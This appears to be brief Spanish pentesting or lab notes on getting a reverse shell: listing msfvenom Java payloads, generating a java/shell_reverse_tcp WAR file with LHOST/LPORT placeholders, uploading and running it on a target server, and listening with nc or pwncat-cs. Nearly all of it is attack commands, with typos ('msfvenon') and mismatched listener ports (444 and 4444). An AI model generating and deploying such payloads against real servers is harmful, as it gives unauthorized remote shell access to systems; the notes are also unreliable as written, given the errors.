```
msfvenon -l payload | grep java

Encontrmos uno que nos permite una reverse shell

Creamos un payload en war para subirlo al servidor y nos permita conectarnos

msfvenon -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o reverse.war

Ese archino lo subimos al servidor y lo ejecutamos 

Primero nos ponemos a las escucha con nc o pwncat-cs

nc -lvnp 444

pwncat-cs -lp 4444   
```